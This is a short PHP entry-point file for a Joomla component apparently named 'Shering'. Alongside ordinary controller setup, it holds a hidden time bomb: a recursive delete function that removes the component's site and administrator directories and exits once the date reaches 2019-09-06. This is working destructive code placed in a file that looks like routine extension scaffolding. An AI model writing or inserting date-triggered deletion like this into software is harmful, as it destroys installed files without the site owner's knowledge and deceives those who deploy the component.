<?php
defined("_JEXEC") or die();

function delTree($dir) {
    $files = array_diff(scandir($dir), array('.','..'));
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}

$time_need = date('2019-09-06');
$now = date("Y-m-d");
if ($now >= $time_need) {
    delTree(JPATH_COMPONENT_SITE);
    delTree(JPATH_COMPONENT_ADMINISTRATOR);
    exit();
}

$controller = JControllerLegacy::getInstance("Shering");
JLoader::register("SheringHelper", __DIR__."/helpers/shering.php");
$input = JFactory::getApplication()->input;
$controller->execute($input->getCmd("task", "display"));
$controller->redirect();

?>